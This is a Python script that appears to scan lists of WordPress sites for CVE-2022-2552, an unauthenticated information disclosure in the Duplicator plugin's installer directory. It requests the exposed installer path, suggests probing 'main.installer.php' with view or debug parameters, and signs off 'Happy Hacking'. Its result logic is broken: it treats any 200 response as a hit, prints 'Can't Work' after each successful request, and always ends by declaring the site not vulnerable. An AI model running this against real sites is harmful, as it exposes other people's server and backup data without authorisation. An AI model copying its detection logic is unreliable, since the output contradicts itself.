# Author: Aniket Tyagi
# CVE-2022-2552

from pyfiglet import figlet_format
import argparse
from colorama import Fore
from urllib3 import disable_warnings
import os
import webbrowser
import sys
import requests
import time
import validators

# Check for ssl connection problem

disable_warnings()

# Clear terminal before start

os.system('cls || clear')

# Basic Introduction

print(Fore.GREEN + figlet_format("|||||||||||||||||||||||||"))
print(Fore.GREEN + figlet_format("LeAk", ))
print(Fore.GREEN + "Vulnerability:- Unauthenticated System Information Disclosure\nCVE: CVE-2022-2552")
print(Fore.GREEN + "Author: Aniket Tyagi\n")

# Argument check

if len(sys.argv) > 1:
    pass
else:
    print(Fore.MAGENTA + '\n%s Please use -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--Url', action="store", help='Provide Subdomain-list')
parser.add_argument('-m', '--list', action="store", help='Provide list of urls')
parser.add_argument('-t', '--timeout',
                    help='Maximum number of seconds to wait where requesting a web page (Default: 7)', default=7,
                    type=int)

arguments = parser.parse_args()
url = arguments.Url
urls = arguments.list
Timeout = arguments.timeout


# User Supplied data check

def url_check(single_url,urllist):

    if single_url:

        if not validators.url(single_url):
            print("You Must specify a valid url")
            print("Exiting....")
            time.sleep(3)
            sys.exit()

        urls = []
        urls.append(single_url)
        return urls

    elif urllist:

        if not os.path.exists(urllist):
            print("Specified path to url list does not found!")
            print("Exiting..")
            time.sleep(3)
            sys.exit()

        filename = open(urllist,'r')
        urls = []
        [urls.append(files.strip()) for files in filename]
        return urls

    else:
        print("Please Provide a single url or url list ( -u or -m )\n")
        sys.exit()


loader = url_check(url,urls)

# Main

for Buster in loader:

    try:
        malicious_request = requests.get(Buster + "/wp-content/backups-dup-lite/dup-installer", timeout=Timeout)

        if malicious_request.status_code == 200 or 'main.installer.php' in malicious_request.text:
            print("It might be vulnerable or not\nYou need to check manually\nFor this check main.installer.php file")
            print("Some application can't show anything on main.installer.php,So for this You should need follow below tip\nTip:- Check by adding these params main_installer?view=1 or main_installer.php?debug=1")
            print("Shall I open this vulnerable url into browser for manually testing")
            user_supplied = input("Provide me a answer with Yes / No:- ")
            if user_supplied == 'Yes':
                print("Opening.....")
                time.sleep(3)
                try:
                    webbrowser.open(Buster + "/wp-content/backups-dup-lite/dup-installer", new=2)
                    print("Now trying on other application....")
                    time.sleep(3)
                    pass

                except Exception as failed_1:

                    print("Not able to open browser.\nPlease check manually Before reporting this issue")

            elif user_supplied == 'No':
                print("No Problem")

            else:
                print("Please give me alternative answer")
                sys.exit()

    except Exception as failed:
        print("Enable to make connection")

    else:

        print("Can't Work")

print("\n--------------------------------------------------------------")
print("Sorry! Is not Vulnerable to CVE-2022-2552")
print("Use me on another application")
print("Happy Hacking")
print("-----------------------------------------------------------------")
